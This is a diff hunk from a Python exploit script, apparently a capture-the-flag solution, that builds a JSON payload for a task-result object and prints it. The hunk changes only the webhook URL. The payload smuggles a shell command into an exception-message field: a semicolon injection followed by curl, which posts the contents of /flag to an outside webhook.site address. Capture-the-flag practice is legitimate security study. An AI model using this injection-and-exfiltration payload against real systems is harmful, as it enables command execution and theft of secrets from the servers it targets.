@@ -25,7 +25,7 @@ hack_tmpl = json.loads('''
 
 sploit_uuid = str(uuid.uuid4())
 hack_tmpl['task_id'] = sploit_uuid
-hack_tmpl['result']['exc_message'][0] = f"localhost; curl -d @/flag https://webhook.site/01042687-35c8-44c5-82b8-a8af26fa120b "
+hack_tmpl['result']['exc_message'][0] = f"localhost; curl -d @/flag https://webhook.site/73b29784-532b-40c6-954f-905e3ecedc68 "
 pld = json.dumps(hack_tmpl)
 print("PAYLOAD:")
 print(pld)
